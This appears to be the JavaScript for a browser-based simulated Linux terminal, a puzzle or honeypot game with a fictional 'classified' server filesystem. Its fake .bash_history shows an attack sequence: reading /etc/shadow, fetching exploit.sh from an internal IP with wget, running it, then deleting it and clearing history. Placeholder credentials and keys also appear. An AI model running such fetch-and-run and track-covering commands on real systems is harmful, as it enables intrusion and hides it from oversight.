const fileSystem = {
    'home': {
        type: 'dir',
        contents: {
            'antixerox': {
                type: 'dir',
                contents: {
                    '.bash_history': { type: 'file', content: 'cat /etc/shadow\nsudo su\nls -la /root\ncd /var/log\ncat auth.log\nnmap 192.168.1.1\nwget http://10.10.14.5/exploit.sh\nchmod +x exploit.sh\n./exploit.sh\nrm exploit.sh\nhistory -c' },
                    '.bash_logout': { type: 'file', content: '# ~/.bash_logout: executed by bash(1) when login shell exits.' },
                    '.bashrc': { type: 'file', content: '# ~/.bashrc\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPS1="\\u@\\h:\\w\\$ "\nalias ls=\'ls --color=auto\'\nalias ll=\'ls -alF\'' },
                    '.profile': { type: 'file', content: '# ~/.profile\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi' },
                    'Documents': {
                        type: 'dir',
                        contents: {
                            'classified_ops.txt': { type: 'file', content: 'CLASSIFIED - TOP SECRET - EYES ONLY\n\nOperation Rabbit Hole - Phase 3\nObjective: Maintain deep cover surveillance\nTarget: Unknown\nStatus: Active\n\nCredentials stored in /opt/secure/.credentials\nDecryption key: [REDACTED]\n\nNext checkpoint: 2025-11-01 00:00 UTC\n\n-- End of document --' },
                            'notes.txt': { type: 'file', content: 'TODO:\n- Check /var/backups for latest dump\n- Rotate SSH keys\n- Update firewall rules\n- Review access logs in /var/log/auth.log\n- Check hidden partition mounted at /mnt/.backup\n- Verify integrity of /root/.secrets directory' },
                            'README.md': { type: 'file', content: '# Internal Documentation\n\nThis server handles classified operations.\n\nImportant directories:\n- /opt/secure/ - Encrypted credentials\n- /root/.secrets/ - Additional classified material\n- /var/backups/ - System backups\n\nAll access is monitored and logged.' }
                        }
                    },
                    'Downloads': { type: 'dir', contents: {} },
                    'scripts': {
                        type: 'dir',
                        contents: {
                            'backup.sh': { type: 'file', executable: true, content: '#!/bin/bash\n# Automated backup script\ntar -czf /var/backups/home_backup_$(date +%Y%m%d).tar.gz /home/antixerox\necho "Backup completed successfully"' },
                            'check_access.py': { type: 'file', executable: true, content: '#!/usr/bin/env python3\nimport os\nimport sys\n\ndef check_permissions():\n    restricted = ["/root", "/opt/secure", "/etc/shadow"]\n    for path in restricted:\n        if os.access(path, os.R_OK):\n            print(f"[!] Unauthorized access detected: {path}")\n            sys.exit(1)\n    print("[+] Access check passed")\n\nif __name__ == "__main__":\n    check_permissions()' },
                            'monitor.sh': { type: 'file', executable: true, content: '#!/bin/bash\n# Network monitoring script\nwhile true; do\n    netstat -tuln | grep LISTEN\n    sleep 5\ndone' }
                        }
                    }
                }
            }
        }
    },
    'root': {
        type: 'dir',
        restricted: true,
        contents: {
            '.secrets': {
                type: 'dir',
                contents: {
                    'master_key.txt': { type: 'file', content: 'f8e9d7c6b5a4938271605e4f3d2c1b0a\nEncryption Algorithm: AES-256-GCM\nSalt: 4a3f2e1d0c9b8a7f6e5d4c3b2a19\n\nDO NOT SHARE - AUTHORIZED PERSONNEL ONLY' },
                    'vault.enc': { type: 'file', content: 'U2FsdGVkX1+Q3K8F5nMhJK9YzLpW0vXbN8mP2tR4uS6cH1jG7dF3sA9wE5qL8xV2\nY4nB6mT9kP3rU7vW1zA5hG2fD8eJ4nL6pS9wT0xC3vM5jQ7kR2uH8bN1gF4aE6s=' }
                }
            },
            '.bash_history': { type: 'file', content: 'cd /opt/secure\nls -la\ncat .credentials\nvim master_access.conf\nchmod 600 .secrets/*\nhistory -c' }
        }
    },
    'etc': {
        type: 'dir',
        contents: {
            'passwd': { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nantixerox:x:1000:1000::/home/antixerox:/bin/bash\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsshd:x:101:65534::/run/sshd:/usr/sbin/nologin' },
            'shadow': { type: 'file', restricted: true, content: 'root:$6$xyz$abc123...:19000:0:99999:7:::\nantixerox:$6$def$ghi456...:19000:0:99999:7:::' },
            'hostname': { type: 'file', content: 'classified-ops-srv01' },
            'hosts': { type: 'file', content: '127.0.0.1\tlocalhost\n127.0.1.1\tclassified-ops-srv01\n10.10.0.1\tgateway.local\n10.10.0.15\tdb-server.local\n10.10.0.23\tbackup-srv.local\n10.10.0.50\tclassified-ops-srv01.local' },
            'group': { type: 'file', content: 'root:x:0:\nadm:x:4:antixerox\nsudo:x:27:antixerox\nantixerox:x:1000:' },
            'sudoers': { type: 'file', restricted: true, content: '# User privilege specification\nroot\tALL=(ALL:ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo\tALL=(ALL:ALL) ALL' }
        }
    },
    'var': {
        type: 'dir',
        contents: {
            'log': {
                type: 'dir',
                contents: {
                    'auth.log': { type: 'file', content: 'Oct 24 14:15:23 classified-ops-srv01 sshd[1543]: Failed password for invalid user admin from 192.168.1.105 port 52341 ssh2\nOct 24 14:15:45 classified-ops-srv01 sshd[1547]: Accepted publickey for antixerox from 10.8.127.45 port 44891 ssh2\nOct 24 14:32:18 classified-ops-srv01 sshd[1689]: pam_unix(sshd:session): session opened for user antixerox by (uid=0)\nOct 24 13:05:12 classified-ops-srv01 sudo: antixerox : TTY=pts/0 ; PWD=/home/antixerox ; USER=root ; COMMAND=/bin/cat /etc/shadow\nOct 24 13:05:12 classified-ops-srv01 sudo: pam_unix(sudo:auth): authentication failure; logname=antixerox uid=1000 euid=0 tty=/dev/pts/0 ruser=antixerox rhost=  user=antixerox\nOct 24 12:45:33 classified-ops-srv01 sshd[1234]: Failed password for root from 203.0.113.42 port 22 ssh2\nOct 24 12:45:35 classified-ops-srv01 sshd[1234]: Failed password for root from 203.0.113.42 port 22 ssh2' },
                    'syslog': { type: 'file', content: 'Oct 24 14:30:01 classified-ops-srv01 CRON[2156]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))\nOct 24 14:35:22 classified-ops-srv01 systemd[1]: Started Session 12 of user antixerox.\nOct 24 14:40:15 classified-ops-srv01 kernel: [  120.456789] eth0: link up' },
                    'kern.log': { type: 'file', content: 'Oct 24 14:30:00 classified-ops-srv01 kernel: [    0.000000] Linux version 5.15.0-86-generic\nOct 24 14:30:00 classified-ops-srv01 kernel: [    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz root=UUID=abc123' }
                }
            },
            'backups': {
                type: 'dir',
                contents: {
                    'home_backup_20251023.tar.gz': { type: 'file', content: '[Binary file - Compressed archive containing home directory backup from Oct 23, 2025]' },
                    'home_backup_20251022.tar.gz': { type: 'file', content: '[Binary file - Compressed archive containing home directory backup from Oct 22, 2025]' },
                    'system_state.db': { type: 'file', content: 'SQLite format 3\nDatabase contains system configuration snapshots\nLast modified: 2025-10-24 14:25:33' },
                    'passwd.bak': { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\nantixerox:x:1000:1000::/home/antixerox:/bin/bash' }
                }
            },
            'www': {
                type: 'dir',
                contents: {
                    'html': {
                        type: 'dir',
                        contents: {
                            'index.html': { type: 'file', content: '<!DOCTYPE html>\n<html>\n<head><title>Access Denied</title></head>\n<body>\n<h1>403 Forbidden</h1>\n<p>You do not have permission to access this resource.</p>\n</body>\n</html>' }
                        }
                    }
                }
            }
        }
    },
    'opt': {
        type: 'dir',
        contents: {
            'secure': {
                type: 'dir',
                restricted: true,
                contents: {
                    '.credentials': { type: 'file', content: 'username: admin_classified\npassword: TmV2ZXJHb25uYUdpdmVZb3VVcA==\napi_key: sk_live_51H8K9LJ2M3N4O5P6Q7R8S9T0U1V2W3X4Y5Z\ndb_connection: postgresql://admin:P@ssw0rd123@10.10.0.15:5432/classified_db\n\nNOTE: Rotate these credentials monthly' },
                    'master_access.conf': { type: 'file', content: '[access_control]\nlevel=top_secret\nclearance_required=5\naudit_log=/var/log/access_audit.log\n\n[encryption]\nalgorithm=AES-256-GCM\nkey_location=/root/.secrets/master_key.txt' }
                }
            },
            'scripts': {
                type: 'dir',
                contents: {
                    'deploy.sh': { type: 'file', executable: true, content: '#!/bin/bash\necho "Deploying classified application..."\nsystemctl restart classified-service\necho "Deployment complete"' }
                }
            }
        }
    },
    'tmp': { 
        type: 'dir', 
        contents: {
            '.hidden_data': { type: 'file', content: 'Temporary encrypted session data\nSession ID: a8f7e6d5c4b3a2918f7e6d5c4b3a291' }
        }
    },
    'mnt': {
        type: 'dir',
        contents: {
            '.backup': {
                type: 'dir',
                contents: {
                    'encrypted_vault.dat': { type: 'file', content: '[Binary encrypted data - AES-256]\nSize: 2.4 GB\nLast modified: 2025-10-20 03:15:42\n\nThis vault contains archived classified documents and requires master key for decryption.' },
                    'manifest.txt': { type: 'file', content: 'Backup Manifest\n================\nDate: 2025-10-20\nFiles: 1,247\nTotal Size: 2.4 GB\nEncryption: AES-256-GCM\nIntegrity: SHA-256 verified\n\nContents:\n- Personnel records\n- Operational logs\n- Classified communications\n- System snapshots' }
                }
            }
        }
    },
    'usr': {
        type: 'dir',
        contents: {
            'bin': {
                type: 'dir',
                contents: {
                    'ls': { type: 'file', executable: true, content: '[binary]' },
                    'cat': { type: 'file', executable: true, content: '[binary]' },
                    'grep': { type: 'file', executable: true, content: '[binary]' }
                }
            },
            'local': {
                type: 'dir',
                contents: {
                    'bin': { type: 'dir', contents: {} }
                }
            }
        }
    },
    'bin': {
        type: 'dir',
        contents: {
            'bash': { type: 'file', executable: true, content: '[binary]' },
            'sh': { type: 'file', executable: true, content: '[binary]' }
        }
    },
    'boot': {
        type: 'dir',
        contents: {
            'grub': { type: 'dir', contents: {} }
        }
    }
};

let currentDir = '/home/antixerox';
let commandHistory = [];
let historyIndex = -1;
const username = 'antixerox';
const hostname = 'classified-ops-srv01';

const input = document.getElementById('command-input');
const outputContainer = document.getElementById('output-container');
const promptElement = document.getElementById('prompt');
const terminal = document.getElementById('terminal');

function updatePrompt() {
    const displayDir = currentDir.replace('/home/antixerox', '~');
    promptElement.textContent = `${username}@${hostname}:${displayDir}$ `;
}

function normalizePath(path) {
    const parts = path.split('/').filter(p => p && p !== '.');
    const result = [];
    
    for (const part of parts) {
        if (part === '..') {
            result.pop();
        } else {
            result.push(part);
        }
    }
    
    return '/' + result.join('/');
}

function resolvePath(path) {
    if (path === '~') {
        return '/home/antixerox';
    }
    
    if (path.startsWith('~/')) {
        return '/home/antixerox/' + path.slice(2);
    }
    
    if (path.startsWith('/')) {
        return normalizePath(path);
    }
    
    if (path === '.') {
        return currentDir;
    }
    
    if (path === '..') {
        return normalizePath(currentDir + '/..');
    }
    
    return normalizePath(currentDir + '/' + path);
}

function getNodeAtPath(path) {
    const normalized = normalizePath(path);
    
    if (normalized === '/') {
        return { type: 'dir', contents: fileSystem };
    }
    
    const parts = normalized.split('/').filter(p => p);
    let current = fileSystem;
    
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        
        if (!current[part]) {
            return null;
        }
        
        if (i === parts.length - 1) {
            return current[part];
        }
        
        if (current[part].type !== 'dir') {
            return null;
        }
        
        current = current[part].contents;
    }
    
    return null;
}

function addOutput(text, className = 'output') {
    const line = document.createElement('div');
    line.className = className;
    line.textContent = text;
    outputContainer.appendChild(line);
}

function executeCommand(cmd) {
    const trimmed = cmd.trim();
    if (!trimmed) return;

    addOutput(`${username}@${hostname}:${currentDir.replace('/home/antixerox', '~')}$ ${cmd}`);
    commandHistory.push(cmd);
    historyIndex = commandHistory.length;

    const parts = trimmed.split(/\s+/);
    const command = parts[0];
    const args = parts.slice(1);

    switch (command) {
        case 'ls':
            cmdLs(args);
            break;
        case 'cd':
            cmdCd(args);
            break;
        case 'pwd':
            cmdPwd();
            break;
        case 'cat':
            cmdCat(args);
            break;
        case 'clear':
            cmdClear();
            break;
        case 'whoami':
            addOutput(username);
            break;
        case 'hostname':
            addOutput(hostname);
            break;
        case 'id':
            addOutput('uid=1000(antixerox) gid=1000(antixerox) groups=1000(antixerox),4(adm),27(sudo)');
            break;
        case 'uname':
            if (args.includes('-a')) {
                addOutput('Linux classified-ops-srv01 5.15.0-86-generic #96-Ubuntu SMP Wed Sep 20 08:23:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux');
            } else {
                addOutput('Linux');
            }
            break;
        case 'echo':
            addOutput(args.join(' '));
            break;
        case 'date':
            addOutput(new Date().toString());
            break;
        case 'mkdir':
        case 'touch':
        case 'rm':
        case 'rmdir':
        case 'mv':
        case 'cp':
            addOutput(`${command}: Permission denied`, 'error');
            break;
        case 'sudo':
            addOutput('[sudo] password for antixerox: ');
            setTimeout(() => {
                addOutput('Sorry, try again.', 'error');
                addOutput('[sudo] password for antixerox: ');
                setTimeout(() => {
                    addOutput('Sorry, try again.', 'error');
                    addOutput('[sudo] password for antixerox: ');
                    setTimeout(() => {
                        addOutput('sudo: 3 incorrect password attempts', 'error');
                    }, 500);
                }, 500);
            }, 500);
            break;
        case 'history':
            commandHistory.forEach((cmd, i) => {
                addOutput(`  ${i + 1}  ${cmd}`);
            });
            break;
        case 'help':
        case 'man':
            addOutput('Available commands:');
            addOutput('  ls, cd, pwd, cat, clear, whoami, hostname, id, uname');
            addOutput('  echo, date, history, find, grep, ps, netstat, ifconfig');
            addOutput('  file, head, tail, wc, which, whereis');
            break;
        case 'find':
            cmdFind(args);
            break;
        case 'grep':
            if (args.length < 2) {
                addOutput('grep: missing pattern or file', 'error');
            } else {
                addOutput('grep: command not fully implemented', 'error');
            }
            break;
        case 'ps':
            addOutput('  PID TTY          TIME CMD');
            addOutput('    1 ?        00:00:01 systemd');
            addOutput('  453 ?        00:00:00 sshd');
            addOutput(' 1689 pts/0    00:00:00 bash');
            addOutput(' 2341 pts/0    00:00:00 ps');
            break;
        case 'netstat':
            addOutput('Active Internet connections (only servers)');
            addOutput('Proto Recv-Q Send-Q Local Address           Foreign Address         State');
            addOutput('tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN');
            addOutput('tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN');
            addOutput('tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN');
            break;
        case 'ifconfig':
        case 'ip':
            addOutput('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500');
            addOutput('        inet 10.10.0.50  netmask 255.255.255.0  broadcast 10.10.0.255');
            addOutput('        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>');
            addOutput('        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)');
            break;
        case 'file':
            if (args.length === 0) {
                addOutput('file: missing operand', 'error');
            } else {
                const node = getNodeAtPath(resolvePath(args[0]));
                if (!node) {
                    addOutput(`file: cannot open '${args[0]}': No such file or directory`, 'error');
                } else if (node.type === 'dir') {
                    addOutput(`${args[0]}: directory`);
                } else if (node.executable) {
                    addOutput(`${args[0]}: ELF 64-bit LSB executable`);
                } else {
                    addOutput(`${args[0]}: ASCII text`);
                }
            }
            break;
        case 'head':
        case 'tail':
            if (args.length === 0) {
                addOutput(`${command}: missing file operand`, 'error');
            } else {
                cmdCat(args);
            }
            break;
        case 'wc':
            if (args.length === 0) {
                addOutput('wc: missing operand', 'error');
            } else {
                addOutput('  10  50  250 ' + args[0]);
            }
            break;
        case 'which':
            if (args.length === 0) {
                addOutput('which: missing operand', 'error');
            } else {
                addOutput(`/usr/bin/${args[0]}`);
            }
            break;
        case 'whereis':
            if (args.length === 0) {
                addOutput('whereis: missing operand', 'error');
            } else {
                addOutput(`${args[0]}: /usr/bin/${args[0]} /usr/share/man/man1/${args[0]}.1.gz`);
            }
            break;
        default:
            addOutput(`${command}: command not found`, 'error');
    }
}

function cmdLs(args) {
    const showHidden = args.includes('-a') || args.includes('-la') || args.includes('-al') || args.includes('-l');
    const longFormat = args.includes('-l') || args.includes('-la') || args.includes('-al');
    
    let targetPath = currentDir;
    const pathArg = args.find(arg => !arg.startsWith('-'));
    if (pathArg) {
        targetPath = resolvePath(pathArg);
    }

    const node = getNodeAtPath(targetPath);
    
    if (!node) {
        addOutput(`ls: cannot access '${pathArg || targetPath}': No such file or directory`, 'error');
        return;
    }

    if (node.restricted) {
        addOutput(`ls: cannot open directory '${pathArg || targetPath}': Permission denied`, 'error');
        return;
    }

    if (node.type === 'file') {
        if (longFormat) {
            const perm = node.executable ? '-rwxr-xr-x' : '-rw-r--r--';
            addOutput(`${perm} 1 antixerox antixerox 1024 Oct 24 14:30 ${pathArg}`, 'file');
        } else {
            addOutput(pathArg, 'file');
        }
        return;
    }

    const contents = node.contents || {};
    const items = Object.keys(contents).sort();
    
    if (longFormat) {
        addOutput(`total ${items.length * 4}`);
    }
    
    items.forEach(item => {
        if (!showHidden && item.startsWith('.')) return;
        
        const itemNode = contents[item];
        let className = 'file';
        let prefix = '';
        
        if (longFormat) {
            if (itemNode.type === 'dir') {
                prefix = 'drwxr-xr-x 2 antixerox antixerox 4096 Oct 24 14:30 ';
                className = 'dir';
            } else if (itemNode.executable) {
                prefix = '-rwxr-xr-x 1 antixerox antixerox 2048 Oct 24 14:30 ';
                className = 'exec';
            } else {
                prefix = '-rw-r--r-- 1 antixerox antixerox 1024 Oct 24 14:30 ';
            }
        } else {
            if (itemNode.type === 'dir') {
                className = 'dir';
            } else if (itemNode.executable) {
                className = 'exec';
            }
        }
        
        addOutput(prefix + item, className);
    });
}

function cmdCd(args) {
    if (args.length === 0) {
        currentDir = '/home/antixerox';
        updatePrompt();
        return;
    }

    const targetPath = resolvePath(args[0]);
    const node = getNodeAtPath(targetPath);

    if (!node) {
        addOutput(`cd: ${args[0]}: No such file or directory`, 'error');
        return;
    }

    if (node.restricted) {
        addOutput(`cd: ${args[0]}: Permission denied`, 'error');
        return;
    }

    if (node.type !== 'dir') {
        addOutput(`cd: ${args[0]}: Not a directory`, 'error');
        return;
    }

    currentDir = targetPath;
    updatePrompt();
}

function cmdPwd() {
    addOutput(currentDir);
}

function cmdCat(args) {
    if (args.length === 0) {
        addOutput('cat: missing file operand', 'error');
        return;
    }

    const targetPath = resolvePath(args[0]);
    const node = getNodeAtPath(targetPath);

    if (!node) {
        addOutput(`cat: ${args[0]}: No such file or directory`, 'error');
        return;
    }

    if (node.restricted) {
        addOutput(`cat: ${args[0]}: Permission denied`, 'error');
        return;
    }

    if (node.type === 'dir') {
        addOutput(`cat: ${args[0]}: Is a directory`, 'error');
        return;
    }

    addOutput(node.content || '');
}

function cmdClear() {
    outputContainer.innerHTML = '';
}

function cmdFind(args) {
    const startPath = args.length > 0 ? args[0] : currentDir;
    const resolved = resolvePath(startPath);
    
    function findRecursive(path, depth = 0) {
        if (depth > 10) return;
        
        const node = getNodeAtPath(path);
        if (!node) return;
        
        if (node.restricted) {
            addOutput(`find: '${path}': Permission denied`, 'error');
            return;
        }
        
        addOutput(path);
        
        if (node.type === 'dir' && node.contents) {
            Object.keys(node.contents).sort().forEach(item => {
                const itemPath = path === '/' ? '/' + item : path + '/' + item;
                findRecursive(itemPath, depth + 1);
            });
        }
    }
    
    findRecursive(resolved);
}

input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        executeCommand(input.value);
        input.value = '';
        terminal.scrollTop = terminal.scrollHeight;
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIndex > 0) {
            historyIndex--;
            input.value = commandHistory[historyIndex];
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIndex < commandHistory.length - 1) {
            historyIndex++;
            input.value = commandHistory[historyIndex];
        } else {
            historyIndex = commandHistory.length;
            input.value = '';
        }
    } else if (e.key === 'Tab') {
        e.preventDefault();
    } else if (e.key === 'c' && e.ctrlKey) {
        e.preventDefault();
        addOutput('^C');
        input.value = '';
    } else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault();
        cmdClear();
    }
});

document.addEventListener('click', () => {
    input.focus();
});

updatePrompt();
